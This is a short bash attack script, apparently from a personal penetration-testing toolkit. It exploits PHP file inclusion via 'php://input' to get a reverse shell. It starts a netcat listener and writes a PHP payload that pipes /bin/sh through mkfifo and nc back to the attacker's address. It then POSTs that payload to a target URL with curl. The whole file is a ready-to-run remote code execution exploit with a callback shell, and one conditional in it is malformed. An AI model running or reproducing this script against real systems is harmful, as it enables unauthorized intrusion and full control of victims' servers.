#!/usr/bin/env bash


source meuk/globalmeuk.sh

echo "[.] Incompentent bastard "

localnic=${1:-}
HOST=${2:-}
LPORT=${3:-}

if [ -z "$localnic" ]; then
  echo "[!] TUN REMOTE (prefixed with r_) or ETH?"
  exit;
fi

if beginswith r_ $1; then

  IP=$(echo "$1" | sed -e "s/^r_//")
  REMOTE=1

fi


if [ -z "$HOST" ]; then
  echo "URL?"
  exit;
fi

if [ -z "$REMOTE"  ]; then
  #todo: move this to globalmeuk.sh
  IP=$(/sbin/ip -o -4 addr list $localnic | awk '{print $4}' | cut -d/ -f1);
fi

if [ $LPORT != '' && $ == $RE ]; then
  PORT=$LPORT
fi

echo '[!] Some times just wait a few secs before hitting CTR+C... to get this to work'
screen -dmS rfi_nc_${PORT} -O -L meuk/logs/rfi_nc_${PORT} nc -lnvp ${PORT}
echo "[!] type screen -r rfi_nc_${PORT} to get your shell" 
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '${IP}' '${PORT}' >/tmp/f");?>' > /tmp/rfi_input_php.txt

curl -v $2'php://input%00' -H '${HTTP_AGENT}' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Content-Length: 181' -H 'Pragma: no-cache' -d '@/tmp/rfi_input_php.txt'

